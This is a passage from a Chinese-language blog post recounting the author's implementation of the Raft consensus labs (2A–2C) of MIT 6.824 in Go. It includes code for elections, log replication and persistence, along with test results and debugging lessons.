&#125;else&#123; rf.electionTimeout.Reset(time.Duration(rf.randTime()) * time.Millisecond) &#125;&#125; 实验总结&emsp;&emsp;完成了2A，了解了raft leader election的流程，之前读论文时感觉懂了，实际实现的时候才发现需要衡量许多小细节，许多边界条件不好把握。强烈建议重构一遍代码，第一次花了一天多时间，亡羊补牢式写代码，哪里出错补哪里，虽然最后也能通过测试，但是体验非常模糊，细节丢三落四，很难构建一个完整的认识；等到重构时，因为知道大概有哪里会有哪些坑，所以一开始就会有意识的避开一些弯路，写起来顺风顺水，这时候才能体会到raft leader election整个运行调度的逻辑。还不错，继续完成后面的实验吧。 坑defer的坑&emsp;&emsp;defer是return之后才会调用。一开始我在函数A里调用了函数B，并且函数B是一去不返不会再回来。当时发现leader一直在发送信息，没有报错，没有角色切换，很纳闷是为什么。后来检查代码才发现，原来是函数A申请了锁，然后defer锁的释放，但是中途去到函数B，而且一去不返，使得函数A一直没有return，也因此不会释放锁。又因为函数B之后不需要其他的锁，所以函数B就一直执行，而其他函数由于一直没有获得锁，所以处于停滞状态，无法更新任期，切换角色。有时候死锁还能看得到，虽然你不一定找得到哪里引发了死锁；但是这种一直跑，也没有停滞，日志又多的情况，也是容易让人摸不着头脑。 角色切换&emsp;&emsp;一个很关键的因素是，你必须弄清楚一个raft的实例的角色会因为什么而改变。穷举出每个角色改变的时机和诱因，然后思考各种可能的并发情况，看看会不会有超乎你意料之外的角色更改时刻。重点关注的是，并发会对角色切换造成什么影响。我遇到过一种情况： leaderA term0，给所有节点发送了一次心跳。 由于网络延迟，followerB term0并没有收到这次心跳信号，超时变为candidateB，并给leaderA发出选举申请。 在收到candidateB term1的选举之前，leaderA心跳信号超时，并发发送了第二次的的心跳信号。 leaderA收到了B的投票，投票给B，并且将自己的term+1变成term1，且将自己变为follower。 此时leaderA第二次给B发送心跳信号的goroutine执行（之前还未执行），此时leaderA的term也是1。 candidateB此时收到term为1的leader发过来的心跳信号，认为当前选举已经决出了新leader，于是将自己变为follower。 结果，此时A和B都变成了follower，集群失去了leader。我的解决思路是：保存leader在执行leader程序时的term，后续的rpc调用都是用这个term，而不是实时的检索leader的term，这样可以快速检查到leader转为follower的情况，还可以排除一些过期leader发出的信号，具体见上面的leader函数。 实验结果12345678//集群初始化，选择新leaderTest (2A): initial election ... ... Passed -- 3.1 3 56 0//leader宕机/掉线，剩下的大部分节点中选出新leaderTest (2A): election after network failure ... ... Passed -- 4.5 3 112 0PASSok raft 7.580s lab2B-日志复制实验要求 第一个测试，TestBasicAgree2B, 就是正常的日志同步。 第二个测试，TestFailAgree2B,在同步了一个日志后，一个节点丢失，在大多数节点同步了五六个日志后才回到集群。这时候：1.重新选举，2.快速同步日志。 第三个测试，TestFailNoAgree2B,共5个节点，在同步了一个日志后，有三个节点失联，测试，然后三个节点恢复，再测试。 第四个测试，TestConcurrentStarts2B,之前是按顺序往leader提交命令，这里是模拟多个客户端并发向leader提交命令，观察同步情况。 第五个测试，TestRejoint2B，目的是为了验证，当一个leader失效后（网络断开），又接受了多个命令，如何在重新加入后完成日志同步的问题。 第六个测试，TestBackup2B,大概就是，5台机器，决出leadaer1后，leader1和一个节点分区，然后发送多条不能commit的指令给leader1。剩下的节点中决出新leader2，发送多条可以commit的指令，然后再关闭其中一台机器，现在leader2仅和一个follower联通，此时给leader2再发送多条不能commit的指令。然后让leader1和其他两个失联的节点恢复，继续疯狂发送多条可以commit的指令。最后要求所有机器的apply顺序相同。 第七个测试，TestCount2B,完成日志复制过程中，所需要用到的RPC个数，不能太多，比如这里是不能超过60个rpc调用。 实验理解&emsp;&emsp;lab2B要求实现日志同步，包括但不限于在各种leader失联、节点宕机、网络延迟等各种情况下保持日志的一致性，别看好像才三种异常情况，但是这三种异常各种排列组合后，将会出现许多出乎你意料之外的边界条件，需要喝杯茶，慢慢去看你自己的log才能发现错误所在。这门实验给我带来的最大的收获，除了对raft的深入理解之外，就是学会打log，别看打log好像很简单的一件事情，但是如何使log快速有效的定位和反应问题，也是一门学问。&emsp;&emsp;当实现lab2B时，才真正明白论文里的lastApplied和matchIndex的含义，在这里先回顾一下： lastApplied：每个server最后一个执行的指令。（在本实验中执行指令=将指令发送到applyCh管道） matchIndex：由leader维护，记录每个follower最后一条同步的指令。&emsp;&emsp;咋一看matchIndex和nextIndex好像功能有点重合？其实不是一回事，在raft中，客户端发来的指令按顺序保存在leader的log中，客户每发来一条指令，leader就将这条指令放在自己的log里。所以新来的日志的“预计”交付下标，就是这条日志到来时leader的log的长度（log下标从1开始，在下标为0处有一个占位符）。&emsp;&emsp;而lastApplied是每个server已经交付了的最新的日志。在leaderCommit比自己的commit大时，可以根据lastApplied，将自己LogEntries上未交付的日志有序交付，保证和其他节点一样的交付顺序。（本实验中，给applyCh交付命令=执行命令）&emsp;&emsp;commitIndex记录的是每个server已经commit的日志，对于follower来说，commit不一定成功，也就不一定会将日志应用到状态机上（在这里，应用到状态机就是给applyCh管道发送信息）。commitIndex记录本节点收到的消息下标，在选举时有用。对于leader来说，只有当超过半数节点响应时，才会增加自己的commitIndex，然后下一次发送心跳信号时，follower通过leaderCommit就知道哪些日志已经超半数节点确认，自己就可以交付响应的日志。&emsp;&emsp;matchIndex则是leader用来保存已经复制到每个follower的日志下标。比如有ABC三个日志发给123三个节点，1节点的日志都丢失了，2的丢失了1个，3的全部到达，当有新的日志D到来时，发送给每个节点的消息就是matchIndex[server]+新消息。&emsp;&emsp;而matchIndex和nextIndex的区别就是，假如leader先发送12两条命令，12的命令还没收到回复，此时matchIndex=0,nextIndex=3，,然后发送345三条命令，此时如果使用matchIndex来计算发送的日志，将会发送12345五条指令；而使用nextIndex来计算发送的日志，将会只发送345三条指令，大大减少了带宽！如果345的指令比12的指令先到怎么办？此时follower的log小于prevLogIndex,所以会拒绝这条命令。 实验代码比起lab2A，这次的代码根据遇到的问题微调了一下。 AppendEntries参数定义，lab3C要求加上论文上讲到的优化技巧，即当follower最后一个日志的term1和leader的prevLogTerm不匹配时，返回follower第一个term1的日志的下标，这样一个冲突的日志，一次RPC就能返回，速度快很多。123456789// field names must start with capital letters!type AppendEntriesReply struct &#123; Term int //接收到信息的follower的currentTerm，方便过期leader更新信息。 Success bool // true if follower contained entry matching prevLogIndex and PrevLogTerm //follower节点第一个与args.Term不相同的日志下标。 //一个冲突的term一次append RPC就能排除 ConflictIndex int&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687//leader调用follower的AppendEntries RPC服务//站在follower角度完成下面这个RPC调用func (rf *Raft) AppendEntries(args *AppendEntriesArgs, reply *AppendEntriesReply) &#123; //follower收到leader的信息 rf.mu.Lock() defer rf.mu.Unlock() reply.ConflictIndex = -1 if args.Term &lt; rf.currentTerm &#123; reply.Term = rf.currentTerm reply.Success = false return &#125; //遇到心跳信号len(args.entries)==0不能直接返回 //因为这时可能args.CommitIndex &gt; rf.commintIndex //需要交付新的日志 //args.Term &gt;= rf.currentTerm //logEntries从下标1开始，log.Entries[0]是占位符 //所以真实日志长度需要-1 curLogLength := len(rf.logEntries) - 1 log_less := curLogLength &lt; args.PrevLogIndex //接收者日志大于等于leader发来的日志 且 日志项不匹配 log_dismatch := !log_less &amp;&amp; rf.logEntries[args.PrevLogIndex].Term != args.PrevLogTerm if log_less || log_dismatch &#123; reply.Term = rf.currentTerm reply.Success = false if log_dismatch&#123; //日志项不匹配，将follower这一个term所有的日志回滚 for index := curLogLength - 1; index &gt;=0; index--&#123; if rf.logEntries[index].Term != rf.logEntries[index+1].Term&#123; reply.ConflictIndex = index + 1 &#125; &#125; &#125; if log_less&#123; //如果follower日志较少 reply.ConflictIndex = curLogLength + 1 &#125; DPrintf(rf.log, "info", "me:%2d term:%3d | receive leader:[%3d] message but not match!\n", rf.me, rf.currentTerm, args.LeaderId) &#125; else &#123; //接收者的日志大于等于prevlogindex rf.currentTerm = args.Term reply.Success = true //修改日志长度 //找到接收者和leader（如果有）第一个不相同的日志 leng := min(curLogLength-args.PrevLogIndex, len(args.Entries)) i := 0 for ; i &lt; leng; i++ &#123; if rf.logEntries[args.PrevLogIndex+i+1].Term != args.Entries[i].Term &#123; rf.logEntries = rf.logEntries[:args.PrevLogIndex+i+1] break &#125; &#125; if i != len(args.Entries) &#123; rf.logEntries = append(rf.logEntries, args.Entries[i:]...) &#125; if len(args.Entries) != 0&#123; //心跳信号不输出 //心跳信号可能会促使follower执行命令 DPrintf(rf.log, "info", "me:%2d term:%3d | receive new command:%3d from leader:%3d, size:%3d\n", rf.me, rf.currentTerm, rf.logEntries[len(rf.logEntries)-1].Command, args.LeaderId, args.PrevLogIndex + len(args.Entries) - rf.commitIndex) &#125; //修改commitIndex if args.LeaderCommit &gt; rf.commitIndex &#123; newCommitIndex := min(args.LeaderCommit, len(rf.logEntries)-1) //不能用goroutine，因为程序要求log按顺序交付 for i := rf.lastApplied + 1; i &lt;= newCommitIndex; i++&#123; rf.applyCh &lt;- ApplyMsg&#123;true, rf.logEntries[i].Command, i&#125; &#125; rf.commitIndex = newCommitIndex rf.lastApplied = newCommitIndex DPrintf(rf.log, "info", "me:%2d term:%3d | Follower commit! cmd:%3d CommitIndex:%3d\n",rf.me ,rf.currentTerm, rf.logEntries[rf.commitIndex].Command, rf.commitIndex) rf.persist() &#125; &#125; //通知follower，接收到来自leader的消息 //即便日志不匹配，但是也算是接收到了来自leader的心跳信息。 go func() &#123; rf.appendCh &lt;- args &#125;()&#125; requestVote主要小心两种情况，第一是follower一轮可能投给多个节点，第二是follower可能一轮选举中不会投给任何一个节点。详见注释。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869//这里是站在接收者follower的角度写的//实现接收者接到一个请求投票时的逻辑func (rf *Raft) RequestVote(args *RequestVoteArgs, reply *RequestVoteReply) &#123; // Your code here (2A, 2B). rf.mu.Lock() defer rf.mu.Unlock() reply.Term = rf.currentTerm reply.VoteGranted = false //当candidate的term比currentTerm小时，不能直接返回 //考虑一种情况 //有ABC三台server，A变成了leader //然后A分区，注意，此时A还是leader //然后BC决出新leaderB，term1 //B接收并执行了五条命令，此时C最后一条日志的term=1 //B网络分区，此时A恢复，且收到B的信息，降为follower，term1 //A超时，变成candidate,term2，发出投票 //B因为网络分区不参与后续事情 //C收到投票，因为C日志比A新，所以不投给A //C超时，term2,发出投票 //A因为和C处于同一个term，不投给C //A超时，term3,给C发投票 //重复 //---------------- //C因为A的日志比C旧，所以不投给A //又因为每次C发起投票时，A的term都和C一样 //所以A不投给C //出现死循环，AC之间不仅没有B数，还永远都不会决出新leader //--------------- //重新思考论文里投票的规则 //其实投票规则就一个，如果candidate的日志比follower的日志更新，就将票投给candidate //同时为了防止同一轮选举中，一个follower投票给两个candidate //所以，只要follower收到投票，就增加commitIndex if rf.currentTerm &gt; args.Term&#123; //过期candidate return &#125; if rf.currentTerm == args.Term &amp;&amp; rf.role == Leader&#123; //同一个term的leader忽略同一个term的candidate发起的投票 return &#125; //只要接到candidate的投票 //就会改变自己的currentTerm rf.currentTerm = args.Term curLogLen := len(rf.logEntries)-1 DPrintf(rf.log, "info", "me:%2d term:%3d curLogLen:%3d logTerm:%3d | candidate:%3d lastLogIndex:%3d lastLogTerm:%3d\n", rf.me, rf.currentTerm, curLogLen, rf.logEntries[curLogLen].Term, args.CandidateId, args.LastLogIndex, args.LastLogTerm) if args.LastLogTerm &gt; rf.logEntries[curLogLen].Term || (args.LastLogTerm == rf.logEntries[curLogLen].Term &amp;&amp; args.LastLogIndex &gt;= curLogLen) &#123; //candidate日志比本节点的日志“新” //判断这一轮选举内是否已经投票给某人 if rf.votedThisTerm &lt; args.Term&#123; rf.votedFor = args.CandidateId rf.votedThisTerm = args.Term reply.Term = rf.currentTerm reply.VoteGranted = true rf.persist() go func() &#123; rf.voteCh &lt;- args &#125;() &#125; &#125;&#125; start12345678910111213141516171819202122func (rf *Raft) Start(command interface&#123;&#125;) (int, int, bool) &#123; index := -1 term := -1 isLeader := true // Your code here (2B). rf.mu.Lock() defer rf.mu.Unlock() term = rf.currentTerm isLeader = rf.role == Leader if isLeader&#123; //logEntries有一个占位符，所以其长度为3时，表明里面有2个命令，而新来的命令的提交index就是3,代表是第三个提交的。 index = len(rf.logEntries) rf.logEntries = append(rf.logEntries, Entries&#123;rf.currentTerm, command&#125;) DPrintf(rf.log, "info", "me:%2d term:%3d | Leader receive a new command:%3d\n", rf.me, rf.currentTerm, command.(int)) rf.persist() &#125; return index, term, isLeader&#125; changeRole1234567891011121314151617//修改角色func (rf *Raft)changeRole(role string)&#123; switch role &#123; case Leader: DPrintf(rf.log, "warn", "me:%2d term:%3d | %12s change role to Leader!\n", rf.me, rf.currentTerm, rf.role) rf.role = Leader case Candidate: rf.currentTerm = rf.currentTerm + 1 rf.votedThisTerm = rf.currentTerm rf.votedFor = rf.me DPrintf(rf.log, "warn", "me:%2d term:%3d | %12s change role to candidate!\n", rf.me, rf.currentTerm, rf.role) rf.role = Candidate case Follower: DPrintf(rf.log, "warn", "me:%2d term:%3d | %12s change role to follower!\n", rf.me, rf.currentTerm, rf.role) rf.role = Follower &#125;&#125; leader别看leader代码好像很多（其实是注释多），其实就是论文上的思路。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178func (rf *Raft)leader()&#123; rf.mu.Lock() curLogLen := len(rf.logEntries) - 1 //记录成为leader时的term，防止被后面的操作修改 //leader发送的term应该是创建goroutine时的term //否则考虑LeaderA term1给followerB term1发送第一次消息，然而延迟，B没收到消息，超时 //B变成candidate，term=2发送选票 //此时A已经停了一个心跳的时间，已经开启了给B发的第二次goroutine，但是还未执行 //A投票给B,并且term=2，此时A变成follower //然而由于发送消息是并发goroutine，A变为follower不会停止这个goroutine的执行。 // 如果用rf.currentTerm,此时A的term为2，执行第二个发送给B消息的goroutine。 //candidate B收到了来自term相同的leader的消息，变为follower。 //最后就是A和B同时变成了follower。 curTerm := rf.currentTerm rf.mu.Unlock() for followerId, _ := range rf.peers&#123; if followerId == rf.me&#123; continue &#125; rf.nextIndex[followerId] = curLogLen + 1 rf.matchIndex[followerId] = 0 &#125; for&#123; commitFlag := true //超半数commit只修改一次leader的logEntries commitNum := 1 //记录commit某个日志的节点数量 commitL := new(sync.Mutex) //用来通知前一半commit的节点，这个日志commit了，可以修改对应的leader.nextIndex[server] commitCond := sync.NewCond(commitL) //广播消息 for followerId, _ := range rf.peers&#123; if followerId == rf.me&#123; continue &#125; //每一个节点的请求参数都不一样 rf.mu.Lock() //每个节点由于nextIndex不同，每次需要更新的日志也不同 //不使用matchIndex而使用nextIndex的原因是 //当发送了12没收到回复,然后发送345时 //使用matchIndex需要发送1~5 //而使用nextIndex只需要发送345即可，可以节省带宽 //不用怕如果follower先收到345，因为345的prevLogIndex和follower的不匹配. //appendArgs := &amp;AppendEntriesArgs&#123;curTerm, // rf.me, // rf.matchIndex[followerId], // rf.logEntries[rf.matchIndex[followerId]].Term, // rf.logEntries[rf.matchIndex[followerId]+1:], // rf.commitIndex&#125; appendArgs := &amp;AppendEntriesArgs&#123;curTerm, rf.me, rf.nextIndex[followerId]-1, rf.logEntries[rf.nextIndex[followerId]-1].Term, rf.logEntries[rf.nextIndex[followerId]:], rf.commitIndex&#125; rf.mu.Unlock() //发送心跳信息 go func(server int) &#123; reply := &amp;AppendEntriesReply&#123;&#125; //DPrintf(rf.log, "info", "me:%2d term:%3d | leader send message to %3d\n", rf.me, curTerm, server) if ok := rf.peers[server].Call("Raft.AppendEntries", appendArgs, reply); ok&#123; //本轮新增的日志数量 appendEntriesLen := len(appendArgs.Entries) rf.mu.Lock() defer rf.mu.Unlock() if rf.currentTerm != curTerm || appendEntriesLen == 0&#123; //如果server当前的term不等于发送信息时的term //表明这是一条过期的信息，不要了 //或者是心跳信号，也直接返回 return &#125; if reply.Success&#123; //append成功 //考虑一种情况 //第一个日志长度为A，发出后，网络延迟，很久没有超半数commit //因此第二个日志长度为A+B，发出后，超半数commit，修改leader //这时第一次修改的commit来了，因为第二个日志已经把第一次的日志也commit了 //所以需要忽略晚到的第一次commit curCommitLen := appendArgs.PrevLogIndex + appendEntriesLen if curCommitLen &gt;= rf.nextIndex[server]&#123; rf.nextIndex[server] = curCommitLen + 1 &#125;else&#123; return &#125; commitCond.L.Lock() defer commitCond.L.Unlock() commitNum = commitNum + 1 if commitFlag &amp;&amp; commitNum &gt; len(rf.peers)/2&#123; //第一次超半数commit commitFlag = false //leader提交日志，并且修改commitIndex //试想，包含日志1的先commit //然后，包含日志1～4的后commit //这时候leader显然只需要交付2～4给client DPrintf(rf.log, "info", "me:%2d term:%3d | curCommitLen:%3d rf.commitIndex:%3d\n", rf.me, rf.currentTerm, curCommitLen, rf.commitIndex) if curCommitLen &gt; rf.lastApplied &#123; //这一次commit的命令多于rf已经应用的命令 //这里需要判断吗？能进来说明curCommitLen &gt;= nextIndex[server] //写博客时才发现这里忘了验证，算了 //说明这一次进来的，一定有还未被提交的命令 //本轮commit的日志长度大于leader当前的commit长度 //假如原来日志长度为10 //发送了1的日志，然后又发送了1~4的日志 //先commit了1的日志，长度变11 //然后接到1~4的commit，curCommitLen=14 //curCommitLen和leader当前日志的差是3 //所以leader只需要commit本次entries的后3个命令即可。 //leader给client commit这次日志 for i := rf.lastApplied + 1; i &lt;= curCommitLen; i++ &#123; //leader将本条命令应用到状态机 rf.applyCh &lt;- ApplyMsg&#123;true, rf.logEntries[i].Command, i&#125; //通知client，本条命令成功commit //上面必须for循环，因为消息要按顺序执行 DPrintf(rf.log, "info", "me:%2d term:%3d | Leader Commit:%4d OK, commitIndex:%3d\n", rf.me, rf.currentTerm, rf.logEntries[i].Command, i) &#125; rf.lastApplied = curCommitLen rf.commitIndex = curCommitLen &#125; &#125; //只要是成功commit的follower，就修改其matchIndex rf.matchIndex[server] = curCommitLen &#125;else&#123; //append失败 if reply.Term &gt; curTerm&#123; //返回的term比发送信息时leader的term还要大 rf.currentTerm = reply.Term rf.changeRole(Follower) //暂时不知道新leader是谁，等待新leader的心跳信息 rf.appendCh &lt;- &amp;AppendEntriesArgs&#123;rf.currentTerm, -1, -1, -1, make([]Entries, 0), -1&#125; &#125;else&#123; //prevLogIndex or prevLogTerm不匹配 rf.nextIndex[server] = reply.ConflictIndex DPrintf(rf.log, "info", "me:%2d term:%3d | Msg to %3d append fail,decrease nextIndex to:%3d\n", rf.me, rf.currentTerm, server, rf.nextIndex[server]) &#125; &#125; &#125; &#125;(followerId) &#125; select &#123; case args := &lt;- rf.appendCh: DPrintf(rf.log, "warn", "me:%2d term:%3d | new leader:%3d , leader convert to follower!\n", rf.me, rf.currentTerm, args.LeaderId) rf.changeRole(Follower) return case args := &lt;- rf.voteCh: DPrintf(rf.log, "warn", "me:%2d term:%3d | role:%12s vote to candidate %3d\n", rf.me, rf.currentTerm, rf.role, args.CandidateId) rf.changeRole(Follower) return case &lt;- time.After(time.Duration(rf.heartBeat) * time.Millisecond): //do nothing &#125; &#125;&#125; candidate12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364func (rf *Raft)candidate()&#123; rf.mu.Lock() //candidate term已经在changeRole里+1了 //发给每个节点的请求参数都是一样的。 logLen := len(rf.logEntries) - 1 requestArgs := &amp;RequestVoteArgs&#123;rf.currentTerm, rf.me, logLen, rf.logEntries[logLen].Term&#125; rf.persist() rf.mu.Unlock() voteCnt := 1 //获得的选票，自己肯定是投给自己啦 voteFlag := true //收到过半选票时管道只通知一次 voteOK := make(chan bool) //收到过半选票 voteL := sync.Mutex&#123;&#125; rf.resetTimeout() for followerId, _ := range rf.peers&#123; if followerId == rf.me&#123; continue &#125; go func(server int) &#123; reply := &amp;RequestVoteReply&#123;&#125; if ok := rf.sendRequestVote(server, requestArgs, reply); ok&#123; //ok仅仅代表得到回复， //ok==false代表本次发送的消息丢失，或者是回复的信息丢失 if reply.VoteGranted&#123; //收到投票 voteL.Lock() voteCnt = voteCnt + 1 if voteFlag &amp;&amp; voteCnt &gt; len(rf.peers)/2&#123; voteFlag = false voteL.Unlock() voteOK &lt;- true &#125;else&#123; voteL.Unlock() &#125; &#125; &#125; &#125;(followerId) &#125; select &#123; case &lt;- rf.appendCh: //收到心跳信息 //case args &lt;- rf.appendCh: //DPrintf(rf.log, "info", "me:%2d term:%3d | receive heartbeat from leader %3d\n", rf.me, rf.currentTerm, args.LeaderId) rf.changeRole(Follower) return case args := &lt;-rf.voteCh: //投票给某人 DPrintf(rf.log, "warn", "me:%2d term:%3d | role:%12s vote to candidate %3d\n", rf.me, rf.currentTerm, rf.role, args.CandidateId) rf.changeRole(Follower) return case &lt;- voteOK: rf.changeRole(Leader) return case &lt;- rf.electionTimeout.C: //超时 DPrintf(rf.log, "warn", "me:%2d term:%3d | candidate timeout!\n", rf.me, rf.currentTerm) rf.changeRole(Follower) return &#125;&#125; follower123456789101112131415161718func (rf *Raft)follower()&#123; for&#123; rf.resetTimeout() select &#123; case &lt;- rf.appendCh: //收到心跳信息 //DPrintf(rf.log, "info", "me:%2d term:%3d | receive heartbeat from leader %3d\n", rf.me, rf.currentTerm, args.LeaderId) case args := &lt;-rf.voteCh: //投票给某人 DPrintf(rf.log, "warn", "me:%2d term:%3d | role:%12s vote to candidate %3d\n", rf.me, rf.currentTerm, rf.role, args.CandidateId) case &lt;- rf.electionTimeout.C: //超时 DPrintf(rf.log, "warn", "me:%2d term:%3d | follower timeout!\n", rf.me, rf.currentTerm) rf.changeRole(Candidate) return &#125; &#125;&#125; 实验结果123456789101112131415161718192021//要求real小于一分钟，user小于5sTest (2B): basic agreement ... ... Passed -- 1.0 5 32 3Test (2B): agreement despite follower disconnection ... ... Passed -- 6.3 3 128 8Test (2B): no agreement if too many followers disconnect ... ... Passed -- 3.9 5 180 4Test (2B): concurrent Start()s ... ... Passed -- 0.7 3 8 6Test (2B): rejoin of partitioned leader ... ... Passed -- 6.8 3 200 4Test (2B): leader backs up quickly over incorrect follower logs ... ... Passed -- 25.8 5 2072 102Test (2B): RPC counts aren't too high ... ... Passed -- 2.4 3 42 12PASSok raft 46.885sreal 0m47.473suser 0m0.796ssys 0m2.276s 坑&emsp;&emsp;管道必须初始化！然而不初始化管道直接使用也不会报错，此时管道就和没有一样。只会停等！ lab2C-持久化数据&emsp;&emsp;老实说，不是很清楚为什么拿2C单独作为lab2的一部分，理论上来说，只要在交付信息的同时持久化数据不就可以了吗。所以我也只是在lab2B的基础上，在相应apply日志的地方插上一句rf.persist()，然后一次性就通过了。 分析&emsp;&emsp;因为要求各server apply的日志顺序和数量是相同的，而同时也希望server在宕机后，通过持久化数据恢复过来后，也能和其他server保持一致，所以我就只保存apply的数据。这样的好处在于数据一定可以一致。坏处在于，可能会丢失一些信息？但我是apply一次就持久化一次，应该不会丢失太多吧。当然，如果说server在apply之后，持久化之前宕机这也是无可奈何的。其实不是很清楚为什么不持久化lastApplied，就算server从宕机恢复后，没有LastApplied也不知道哪些日志已经执行了啊。噢，也许这就是快照的意义所在？一个server宕机后恢复，可以理解为这个server重置回初始状态，需要将logs里的指令重新按顺序执行一遍。而快照的意义在于，可以定时保存server的状态和已经执行的日志，那么，当server宕机后，可以直接恢复到快照对应的状态，并且执行后续未执行的日志。&emsp;&emsp;分析一下持久化数据term、votedFor、log[]可能会改变的情况： follower： 在投票给某人（在requestVote） 收到appnd并且要交付信息到applyCh时才persist（在appendEntries） 转为candidate时（在candidate函数里持久化） andidate： 投票给其他人（修改了currentTerm和votedFor)（在requestVote） 收到append并且要交付信息（在appendEntries） Leader: 从start()函数收到新信息时保存，此时会更新logEntries 投票给更高term的candidate（在requestVote） 收到更高term的leader（在appendEntries）综上，只要修改 start requestVote appendEntries candidate四个函数即可。（代码见lab2B） 实验代码持久化代码123456789101112131415161718192021func (rf *Raft) persist() &#123; // Your code here (2C). // Example: // w := new(bytes.Buffer) // e := labgob.NewEncoder(w) // e.Encode(rf.xxx) // e.Encode(rf.yyy) // data := w.Bytes() // rf.persister.SaveRaftState(data) //这里是假设rf.persist()都在已经拿到锁的时候调用 //所以这里不申请锁 w := new(bytes.Buffer) enc := labgob.NewEncoder(w) enc.Encode(rf.currentTerm) enc.Encode(rf.votedFor) enc.Encode(rf.logEntries) data := w.Bytes() rf.persister.SaveRaftState(data) DPrintf(rf.log, "info", "me:%2d term:%3d | Role:%10s Persist data! VotedFor:%3d len(Logs):%3d\n", rf.me, rf.currentTerm, rf.role, rf.votedFor, len(rf.logEntries))&#125; 读取保存的代码12345678910111213141516171819202122232425262728293031323334353637unc (rf *Raft) readPersist(data []byte) &#123; if data == nil || len(data) &lt; 1 &#123; // bootstrap without any state? return &#125; // Your code here (2C). // Example: // r := bytes.NewBuffer(data) // d := labgob.NewDecoder(r) // var xxx // var yyy // if d.Decode(&amp;xxx) != nil || // d.Decode(&amp;yyy) != nil &#123; // error... // &#125; else &#123; // rf.xxx = xxx // rf.yyy = yyy // &#125; //只有一个raft启动时才调用此函数，所以不申请锁 r := bytes.NewBuffer(data) dec := labgob.NewDecoder(r) var term int var votedFor int var logs []Entries //还没运行之前调用此函数 //所以不用加锁了吧 if dec.Decode(&amp;term) != nil || dec.Decode(&amp;votedFor) !=nil || dec.Decode(&amp;logs) != nil&#123; DPrintf(rf.log, "info", "me:%2d term:%3d | Failed to read persist data!\n") &#125;else&#123; rf.currentTerm = term rf.votedFor = votedFor rf.logEntries = logs DPrintf(rf.log, "info", "me:%2d term:%3d | Read persist data successful! VotedFor:%3d len(Logs):%3d\n", rf.me, rf.currentTerm, rf.votedFor, len(rf.logEntries)) &#125;&#125; 实验结果123456789101112131415161718Test (2C): basic persistence ... ... Passed -- 4.6 3 252 6Test (2C): more persistence ... ... Passed -- 24.9 5 2216 19Test (2C): partitioned leader and one follower crash, leader restarts ... ... Passed -- 2.3 3 60 4Test (2C): Figure 8 ... ... Passed -- 32.2 5 29736 14Test (2C): unreliable agreement ... ... Passed -- 5.5 5 212 246Test (2C): Figure 8 (unreliable) ... ... Passed -- 37.6 5 3668 576Test (2C): churn ... ... Passed -- 16.3 5 928 385Test (2C): unreliable churn ... ... Passed -- 16.4 5 848 226PASSok raft 139.815s 综合实验结果12345678910111213141516171819202122232425262728293031323334353637A+B+C要求四分钟内完成，且cpu时间小于一分钟。Test (2A): initial election ... ... Passed -- 3.0 3 54 0Test (2A): election after network failure ... ... Passed -- 4.5 3 118 0Test (2B): basic agreement ... ... Passed -- 1.0 5 32 3Test (2B): agreement despite follower disconnection ... ... Passed -- 6.4 3 130 8Test (2B): no agreement if too many followers disconnect ... ... Passed -- 3.8 5 176 4Test (2B): concurrent Start()s ... ... Passed -- 0.7 3 8 6Test (2B): rejoin of partitioned leader ... ... Passed -- 6.6 3 192 4Test (2B): leader backs up quickly over incorrect follower logs ... ... Passed -- 28.3 5 2168 102Test (2B): RPC counts aren't too high ... ... Passed -- 2.3 3 42 12Test (2C): basic persistence ... ... Passed -- 4.9 3 246 6Test (2C): more persistence ... ... Passed -- 25.3 5 2200 19Test (2C): partitioned leader and one follower crash, leader restarts ... ... Passed -- 2.4 3 60 4Test (2C): Figure 8 ... ... Passed -- 30.5 5 27540 17Test (2C): unreliable agreement ... ... Passed -- 5.8 5 224 246Test (2C): Figure 8 (unreliable) ... ... Passed -- 37.3 5 3532 305Test (2C): churn ... ... Passed -- 16.3 5 1524 177Test (2C): unreliable churn ... ... Passed -- 16.3 5 1140 272PASSok raft 195.444s 坑&emsp;&emsp;刚才说一次完成，其实是不准确的。后来多跑了几次，发现lab2C的TestFigure8Unreliable2C偶尔会出现错误，当测试运行超过40s时就会出错，而我的程序5次大概有一次会超过40s报错吧。检查一下代码，应该是在某种情况下选举时间太久的原因，减少定时器时间，或者重构一下代码，减少选举需要的RPC数量也许就能彻底解决这个问题。 实验总结&emsp;&emsp;连续三四天朝九晚十，终于独立完成通过lab2。这一次实现并没有考虑data race，几乎都不通过，但是test全部都通过了。对于raft有了本质的认识，虽然只是一个小玩具，但是大概了解了一个分布式系统是怎么搭建的，运行的内核是怎样建立的，虽说有些概念还有些模糊，但也是获益匪浅。休息一下，过几天准备参考这里重构一下代码。 重构收获&emsp;&emsp;只要是根据论文复现，并且过了test的，大体思路都差别不大。重构之前还以为会一切推到重来，后来发现其实只要修改一点点就可以了。最大的改变就是用一个大循环来判断状态执行函数，而不是我之前的每个状态函数死循环直到切换状态执行其他函数。网上很多人都是前者，我要好好思考下这么做的好处才行。第二个改变就是代码更加模块化，不像之前都挤在一起，可读性差。&emsp;&emsp;重构时调试很迷，一个下午都不知道错误在哪里，看了几遍代码，到了晚上突然就好了。&emsp;&emsp;重构后有一些进步，之前TestFigure8Unreliable2C是5次会报错一次,重构之后我用脚本运行所有测试50次，报错了一次，还是没解决这个问题，但是我用脚本单独跑这个测试100次，一次问题都没有，有点意思。不过我不打算改了，心累，开始做后面的实验了。]]></content>
      <categories>
        <category>分布式</category>
        <category>MIT</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>MIT6.824</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MIT6.824-LEC05-Raft]]></title>
    <url>%2F2019%2F05%2F29%2FMIT6-824-LEC05-Raft%2F</url>
